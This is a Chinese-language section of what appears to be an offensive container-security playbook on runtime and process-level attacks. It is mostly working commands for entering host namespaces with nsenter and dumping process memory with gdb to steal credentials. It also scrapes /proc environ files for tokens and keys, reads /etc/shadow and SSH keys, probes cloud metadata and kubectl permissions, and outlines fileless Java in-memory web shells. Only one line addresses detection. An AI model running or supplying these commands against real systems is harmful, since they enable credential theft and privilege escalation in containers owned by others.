## 十一、运行时安全与进程级攻击

### 11.1 进程注入与动态分析

```bash
# nsenter 注入（宿主 PID namespace 可见时）
nsenter --target <PID> --mount --uts --ipc --net --pid -- /bin/bash

# ptrace 注入（需 CAP_SYS_PTRACE）
# gdb attach / ptrace 读写目标进程内存（SSH/数据库进程中的凭据）
gdb -p <pid> -batch -ex "dump memory /tmp/mem.bin 0x600000 0x610000"

# /proc 凭据收割
for p in /proc/[0-9]*/environ; do echo "== $p =="; strings "$p" 2>/dev/null | grep -iE "token|secret|password|AKIA|key"; done
```

### 11.2 内存马注入（Web 容器场景）

```
# Java 容器内存马：通过 JNDI/反序列化/中间件接口注入 Filter/Servlet/Listener
# - 无文件落地、重启消失、绕过 WebShell 扫描
# - 关联技能：fastjson-exploitation（JNDI 反序列化链）
# 检测：JDK 线程/ClassLoader 审计、RASP、内存马检测工具
# 其他：Java Agent 型内存马（attach 方式，需 ptrace/agent 能力）

# 进程替换/进程伪装：替换容器内合法进程为恶意程序（同 PID 存活）
```

### 11.3 容器内提权与信息收集汇总

```bash
# 一次性信息收集脚本思路
uname -a; id; cat /etc/os-release
env | sort                                # 环境变量中的凭据
find / -name "*.env" -o -name "config*" 2>/dev/null | xargs grep -liE "pass|token|key" 2>/dev/null
ls -la /root/.ssh /home/*/.ssh 2>/dev/null
cat /etc/shadow 2>/dev/null && echo "[!] 可读 shadow - 容器为 root 且无 userns 映射"
kubectl 2>/dev/null && kubectl auth can-i --list
curl -s -m2 http://169.254.169.254/latest/meta-data/ 2>/dev/null && echo "[!] 云元数据可达"
```

